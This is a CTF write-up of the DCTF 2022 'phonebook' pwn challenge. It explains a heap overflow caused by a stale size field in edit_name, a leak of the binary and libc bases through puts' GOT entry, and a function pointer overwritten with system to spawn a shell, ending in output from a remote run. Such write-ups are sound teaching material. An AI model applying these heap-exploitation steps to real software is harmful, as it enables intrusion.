+++
title = "[DCTF 2022 - pwn] phonebook"
tags = ["ctf", "ret2school", "DCTF", "nasm", "pwn", "2022"]
date = "2022-04-17"
+++

## Intro

phonebook is a basic heap challenge I did during the dctf event. It's basically just a heap overflow wich allows us to overflow a function pointer with for example the address of system.

## The bug

```
$ ./phonebook
Choose an option: [1-5]
1. Store someone's information
2. Edit information
3. Call someone
4. Unfriend someone
5. Add the hidden_note
> 
```

We can create an entity and then initialize: a name, a numero and a function pointer.
```c
int __fastcall create(unsigned int a1)
{
  int result; // eax
  struct entity *s; // [rsp+18h] [rbp-8h]

  if ( people[a1] )
    return printf("Person with id %d already exists!", a1);
  s = malloc(0x20uLL);
  s->name = get_name();
  LODWORD(s->name_size) = strlen(s->name);
  printf("Phone number: ");
  fgets(s, 8, _bss_start); // phone number
  s->func = choose_relation();
  result = s;
  people[a1] = s;
  return result;
}
```
The bug lies `edit_name` function:

```c
unsigned __int64 __fastcall edit_name(int a1)
{
  int n; // [rsp+18h] [rbp-18h] BYREF
  int name_size; // [rsp+1Ch] [rbp-14h]
  struct entity *v4; // [rsp+20h] [rbp-10h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v4 = people[a1];
  name_size = v4->name_size;
  printf("Name length: ");
  __isoc99_scanf("%d", &n);
  fgets(v4->name, 2, _bss_start);
  if ( name_size != n )
  {
    free(v4->name);
    v4->name = malloc(n + 1);
  }
  printf("Name: ");
  fgets(v4->name, n, _bss_start);
  v4->name[n] = 0;
  return __readfsqword(0x28u) ^ v5;
}
```

We can give it a new lentgh and if that's not equal to the current size field it frees the current name pointer and allocates a new name pointer **without** updating the size field. Which means if we edit the name pointer with a smaller size, the name pointer will be smaller compared to the size field, then we just have to edit again the size field to make it equal to `v4->name_size` to trigger a heap overflow through the `v4->name` pointer.

## Leak libc

Now we're able to overflow through the name pointer we have to find how the leak the libc, a nice way would be to leak it by using free'd chunks in the unsortedbin. Or we can leak the `entity->func` function pointer which would give us a leak of the binary base address, then we would have to edit the name pointer with the got entry of `puts` to leak its address within the libc.

To do so we can create another entity right after the name pointer:
```
0x559b0d4d16b0	0x0000000000000000	0x0000000000000031	........1.......
0x559b0d4d16c0	0x3131313131313131	0x0000559b0c84f2a1	11111111.....U..
0x559b0d4d16d0	0x0000559b0d4d1800	0x00000000000000fe	..M..U..........
0x559b0d4d16e0	0x0000000000000000	0x0000000000000111	................
0x559b0d4d16f0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1700	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1710	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1720	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1730	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1740	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1750	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1760	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1770	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1780	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1790	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17a0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17b0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17c0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17d0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17e0	0x4141414141414141	0x0000414141414141	AAAAAAAAAAAAAA..
0x559b0d4d17f0	0x0000000000000000	0x0000000000000031	........1.......
0x559b0d4d1800	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
0x559b0d4d1810	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
0x559b0d4d1820	0x0000000000000000	0x0000000000000031	........1.......
0x559b0d4d1830	0x3131313131313131	0x0000559b0c84f2a1	11111111.....U..
0x559b0d4d1840	0x0000559b0c851fa0	0x000000000000000a	.....U..........
0x559b0d4d1850	0x0000000000000000	0x000000000001f7b1	................	 <-- Top chunk
```

The ```edit_phone_number``` overwrites the null byte:
```c
__int64 __fastcall edit_phone_number(int a1)
{
  printf("Enter new phone number: ");
  return __isoc99_scanf("%8s", people[a1]);
}
```

To summarise:
- leak binary base address by overwriting the null byte (`edit_phone_number`) and then print the phone numer.
- leak libc base address by overwriting the name field of the second entity with the got entry of `puts`

## PROFIT

Then we just have to overwrite the function pointer with the address of `system` which takes as first argument a pointer to the entity structure of edit the phone number of the entity we wanna use because that's the first field of the structure which means we make it equivalent to a `system("/bin/sh")`.
```
00000000 entity          struc ; (sizeof=0x20, mappedto_8)
00000000 num             dq ?
00000008 func            dq ?
00000010 name            dq ?                    ; offset
00000018 name_size       dq ?
00000020 entity          ends
```

Then here we are:
```
$ python3 exploit.py REMOTE HOST=51.124.222.205 PORT=13380
[*] '/home/nasm/Documents/phonebook/chall/phonebook_patched_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
[+] Opening connection to 51.124.222.205 on port 13380: Done
[*] binary: 0x558980fdd000
[*] libc @ 0x7fabfec57000
[*] system @ 0x7fabfeca92c0
[*] Switching to interactive mode
$ id
uid=1337 gid=1337 groups=1337
$ cat flag.txt
DCTF{C4n_1_g3t_y0ur_numb3r?}
```
